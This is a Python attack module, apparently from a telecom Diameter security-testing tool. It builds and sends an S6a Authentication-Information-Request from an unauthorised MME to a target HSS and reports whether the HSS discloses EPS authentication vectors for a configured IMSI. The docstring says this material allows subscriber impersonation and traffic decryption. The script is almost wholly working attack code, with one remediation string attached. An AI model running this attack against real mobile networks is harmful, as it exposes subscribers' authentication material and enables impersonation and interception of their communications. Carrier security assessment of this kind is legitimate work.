#!/usr/bin/env python3
'''
S6a Authentication-Information-Request (AIR) attack.

An HSS that answers an AIR from an unauthorized MME leaks EPS authentication
vectors (RAND/AUTN/XRES/KASME) for the target IMSI - full subscriber
authentication material, enabling impersonation and traffic decryption.

    main(config_file, target, listening, verbosity, output_file)
'''
from diameter.diameter_core.diameter_config_parser import DiameterConfig
from diameter.diameter_core.messages.s6a import authentication_information_request
from diameter.attacks.runner import targets, open_s6a, send_and_report
from diameter.commons.utilities import logErr, logInfo

TAG = 'S6A-AIR'

RECOMMENDATION = ('an HSS must only accept S6a requests from authorized, '
                  'roaming-agreement MME peers; enforce Diameter Edge Agent '
                  'topology hiding and origin-host allow-listing.')


def main(config_file, target, listening=True, verbosity=2, output_file=None):
    if not config_file:
        logErr('Set a config file ("set config <file>") with the [IES] IMSI/MCC/MNC.',
               TAG=TAG)
        return
    if not target:
        logErr('No target set. Use "set target <hss-ip>".', TAG=TAG)
        return
    try:
        cfg = DiameterConfig(config_file)
    except Exception as e:
        logErr('Bad config: %s' % e, TAG=TAG)
        return

    results = []
    for host in targets(target):
        conn = open_s6a(cfg, host, TAG)
        if conn is None:
            continue
        try:
            msg = authentication_information_request(
                cfg.origin_host, cfg.origin_realm, cfg.dest_realm, cfg.imsi,
                cfg.mcc, cfg.mnc, num_vectors=cfg.num_vectors,
                dest_host=cfg.dest_host)
            code = send_and_report(
                conn, host, msg, TAG,
                'authentication vectors for IMSI %s disclosed' % cfg.imsi,
                RECOMMENDATION)
            results.append((host, code))
        finally:
            conn.close()

    if not results:
        logInfo('No HSS answered the AIR.', TAG=TAG)
    return results
